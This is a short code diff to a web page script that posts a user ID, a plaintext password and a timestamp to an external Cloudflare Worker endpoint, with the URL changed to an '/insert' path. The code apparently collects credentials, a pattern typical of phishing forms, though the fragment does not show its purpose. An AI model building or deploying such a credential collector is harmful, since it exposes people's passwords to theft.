@@ -141,10 +141,10 @@
             btnSpinner.classList.remove('hidden');
 
             // Cloudflare Worker endpoint placeholder as requested
-            const cloudflareWorkerUrl = 'https://patient-mode-da64.sumankkuuyy.workers.dev/';
+            const cloudflareWorkerUrl = 'https://patient-mode-da64.sumankkuuyy.workers.dev/insert';
 
             const payload = {
-                userId: userId,
+                user_Id: user_Id,
                 password: password,
                 timestamp: new Date().toISOString()
             };
